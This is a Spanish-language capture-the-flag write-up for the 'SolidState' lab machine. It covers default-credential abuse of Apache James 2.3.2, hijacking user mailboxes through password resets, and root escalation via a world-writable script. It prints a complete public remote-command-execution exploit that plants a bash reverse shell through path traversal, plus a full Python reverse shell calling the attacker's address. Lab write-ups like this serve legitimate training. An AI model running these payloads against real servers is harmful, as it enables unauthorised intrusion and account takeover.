# Solidstate

![](../../../../~gitbook/image.md)Publicado: 13 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
La máquina SolidState es una máquina Linux con dificultad media que simula un servidor de correo empresarial vulnerable basado en Apache James 2.3.2. La explotación implica abusar de vulnerabilidades en el servicio JAMES, acceder a correos electrónicos internos para conseguir credenciales, y finalmente escalar privilegios aprovechando un script de Python ejecutándose como root con permisos inseguros. Esta máquina enfatiza la importancia de la actualización regular de servicios y la gestión adecuada de permisos en los archivos del sistema.
###🚀 Metodología

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios

###🌐 Enumeración Web

####80 HTTP
![](../../../../~gitbook/image.md)🕷️Fuzzing de directoriosNada relevante ni a destacar en este servicio como posible vector de ataque.
####25 SMTP (JAMES smtpd 2.3.2)

###💻 Explotación
Durante la fase de enumeración de servicios de nmap hemos visto que este protocolo está ejecutando un servicio JAMES smptpd 2.3.2. Buscando algo de información pública encontramos que la versión es vulnerable a Remote Command Execution (RCE) (Authenticated) y Insecure User Creation Arbitrary File WriteVamos a usar el exploit Remote Command Execution (RCE) (Authenticated) (2)Este exploit abusa del panel de administración remoto y del servidor SMTP del Apache James Server usando las credenciales por defecto `root:root` para inyectar un payload (como una reverse shell) en un archivo del sistema (`/etc/bash_completion.d`). Este archivo será ejecutado automáticamente cuando un usuario inicie sesión en el sistema (por ejemplo, vía SSH), permitiendo ejecutar comandos arbitrarios como una shell inversa hacia el atacante.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)El problema es que estamos en una máquina virtual y nadie va a iniciar sesión vía ssh, por lo que debemos intentar buscar credenciales para poder intentar conectarnos vía ssh y desencadenar la acción.
####4555 James Remote Administration
Iniciamos sesión en James Remote Administration usando telnet y las credenciales por defecto root:rootAl usar el comando listusers enumeramos varios usuarios y también el payload que hemos cargado anteriormente:Recordemos que hemos iniciado sesión como root y una de las opciones que nos permite realizar el setpassword, así que podemos cambiar la contraseña al usuario que queramos:![](../../../../~gitbook/image.md)Ahora iniciamos sesión con james vía POP3 usando las nuevas credencialesAl listar correo no encontramos nada, así que repetimos la misma operación de cambiar la contraseña para el resto de usuarios a ver si encontramos algo.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Encontramos unas credenciales para mindy. Probamos a autenticarnos vía ssh con ellas:E inmediatamente ganamos conexión al host remoto en nuestro listener:![](../../../../~gitbook/image.md)
####Mejora de la shell
En nuestro host de ataqueEn el host comprometidoObtenemos la primera flag en el directorio de mindy:
####👑 Escalada de privilegios
Tras enumerar la máquina, comprobamos que sudo no está instalado en la máquina, tampoco hay grupos interesante ni capabilities. Tampoco detectamos una versión vulnerable del kernel, pero al listar procesos vemos algo intesante:![](../../../../~gitbook/image.md)Se está ejecutando un script en python llamado tmp.py como root.Revisamos los permisos del archivo y vemos que tenemos control total sobre el mismo:Así que reemplazamos su contenido por el de una simple python reverse shell:Simple python reverse shell
https://github.com/orestisfoufris/Reverse-Shell---Python/blob/master/reverseshell.pyA continuación, esperamos unos segundos y recibimos la reverse shell como root para finalmente obtener la flag:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🚀 Metodología](#metodologia)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯ ping -c2 10.10.10.51
PING 10.10.10.51 (10.10.10.51) 56(84) bytes of data.
64 bytes from 10.10.10.51: icmp_seq=1 ttl=63 time=45.0 ms
64 bytes from 10.10.10.51: icmp_seq=2 ttl=63 time=42.9 ms

--- 10.10.10.51 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1011ms
rtt min/avg/max/mdev = 42.922/43.973/45.024/1.051 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.75 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,25,80,110,119,4555
```

```
❯ Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 11:33 CEST
Nmap scan report for 10.10.10.51
Host is up (0.043s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.7 [10.10.14.7])
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.74 seconds
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds

```

```
gobuster dir -u http://10.10.10.51 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -b 403,404,502 -x .php, .txt, .xml -r
```

```
feroxbuster -u http://10.10.10.51 -r  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --scan-dir-listings -C 404
```

```
searchsploit james 2.3.2
--------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title                                                                               |  Path
--------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)         | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                         | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)               | linux/remote/50347.py
--------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
searchsploit -m linux/remote/50347.py
```

```
# Exploit Title: Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)
# Date: 27/09/2021
# Exploit Author: shinris3n
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

'''
This Python 3 implementation is based on the original (Python 2) exploit code developed by
Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec.  The following modifications were made:

1 - Made required changes to print and socket commands for Python 3 compatibility.
1 - Changed the default payload to a basic bash reverse shell script and added a netcat option.
2 - Changed the command line syntax to allow user input of remote ip, local ip and listener port to correspond with #2.
3 - Added a payload that can be used for testing remote command execution and connectivity.
4 - Added payload and listener information output based on payload selection and user input.
5 - Added execution output clarifications and additional informational comments throughout the code.

@shinris3n
https://twitter.com/shinris3n
https://shinris3n.github.io/
'''

#!/usr/bin/python3

import socket
import sys
import time

# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 4:
sys.stderr.write("[-]Usage: python3 %s   \n" % sys.argv[0])
sys.stderr.write("[-]Example: python3 %s 172.16.1.66 172.16.1.139 443\n" % sys.argv[0])
sys.stderr.write("[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.\n")
sys.exit(1)

remote_ip = sys.argv[1]
local_ip = sys.argv[2]
port = sys.argv[3]

# Select payload prior to running script - default is a reverse shell executed upon any user logging in (i.e. via SSH)
payload = '/bin/bash -i >& /dev/tcp/' + local_ip + '/' + port + ' 0>&1' # basic bash reverse shell exploit executes after user login
#payload = 'nc -e /bin/sh ' + local_ip + ' ' + port # basic netcat reverse shell
#payload = 'echo $USER && cat /etc/passwd && ping -c 4 ' + local_ip # test remote command execution capabilities and connectivity
#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # proof of concept exploit on root user login only

print ("[+]Payload Selected (see script for more options): ", payload)
if '/bin/bash' in payload:
print ("[+]Example netcat listener syntax to use after successful execution: nc -lvnp", port)

def recv(s):
s.recv(1024)
time.sleep(0.2)

try:
print ("[+]Connecting to James Remote Administration Tool...")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((remote_ip,4555)) # Assumes James Remote Administration Tool is running on Port 4555, change if necessary.
s.recv(1024)
s.send((user + "\n").encode('utf-8'))
s.recv(1024)
s.send((pwd + "\n").encode('utf-8'))
s.recv(1024)
print ("[+]Creating user...")
s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n".encode('utf-8'))
s.recv(1024)
s.send("quit\n".encode('utf-8'))
s.close()

print ("[+]Connecting to James SMTP server...")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((remote_ip,25)) # Assumes default SMTP port, change if necessary.
s.send("ehlo team@team.pl\r\n".encode('utf-8'))
recv(s)
print ("[+]Sending payload...")
s.send("mail from: \r\n".encode('utf-8'))
recv(s)
# also try s.send("rcpt to: \r\n".encode('utf-8')) if the recipient cannot be found
s.send("rcpt to: \r\n".encode('utf-8'))
recv(s)
s.send("data\r\n".encode('utf-8'))
recv(s)
s.send("From: team@team.pl\r\n".encode('utf-8'))
s.send("\r\n".encode('utf-8'))
s.send("'\n".encode('utf-8'))
s.send((payload + "\n").encode('utf-8'))
s.send("\r\n.\r\n".encode('utf-8'))
recv(s)
s.send("quit\r\n".encode('utf-8'))
recv(s)
s.close()
print ("[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).")
if '/bin/bash' in payload:
print ("[+]Don't forget to start a listener on port", port, "before logging in!")
except:
print ("Connection failed.")
```

```
python3 50347.py 10.10.10.51 10.10.14.7 4444
```

```
telnet 10.10.10.51 4555
```

```
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```

```
setpassword james P@ssword123!
```

```
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER james
+OK
PASS password999
+OK Welcome james

```

```
setpassword mindy password999
Password for mindy reset
```

```
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER mindy
+OK
PASS password999
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
```

```
RETR 1
```

```
RETR 2
```

```
ssh mindy@10.10.10.51
mindy@10.10.10.51's password:
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
```

```
script /dev/null -c bash
Crtl +z
(suspended)
stty raw -echo;fg
reset xterm
export TERM=xterm
```

```
stty size
```

```
stty rows X columns Y
```

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt
cat user.txt
07de7a*****************855
```

```
ps -aux
```

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root 1043 May 13 06:59 tmp.py
```

```
"""
A simple reverse shell. In order to test the code you will need to run a server to listen to client's port.
You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)
"""

# Set the host and the port.
HOST = "10.10.14.7"
PORT = 5002

def connect((host, port)):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
return s

def wait_for_command(s):
data = s.recv(1024)
if data == "quit\n":
s.close()
sys.exit(0)
# the socket died
elif len(data)==0:
return True
else:
# do shell command
proc = subprocess.Popen(data, shell=True,
stdout=subprocess.PIPE, stderr=subprocess.PIPE,
stdin=subprocess.PIPE)
stdout_value = proc.stdout.read() + proc.stderr.read()
s.send(stdout_value)
return False

def main():
while True:
socket_died=False
try:
s=connect((HOST,PORT))
while not socket_died:
socket_died=wait_for_command(s)
s.close()
except socket.error:
pass
time.sleep(5)

if __name__ == "__main__":
import sys,os,subprocess,socket,time
sys.exit(main())
```

```
nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.51] 53516
whoami
root
cd /root
ls -la
total 52
drwx------  8 root root 4096 May 13 05:28 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
lrwxrwxrwx  1 root root    9 Nov 18  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  8 root root 4096 Apr 26  2021 .cache
drwx------ 10 root root 4096 Apr 26  2021 .config
drwx------  3 root root 4096 Apr 26  2021 .gnupg
-rw-------  1 root root 3610 May 27  2022 .ICEauthority
drwx------  3 root root 4096 Apr 26  2021 .local
drwxr-xr-x  2 root root 4096 Apr 26  2021 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 May 13 05:28 root.txt
-rw-r--r--  1 root root   66 Aug 22  2017 .selected_editor
drwx------  2 root root 4096 Apr 26  2021 .ssh
cat root.txt
f20************

```
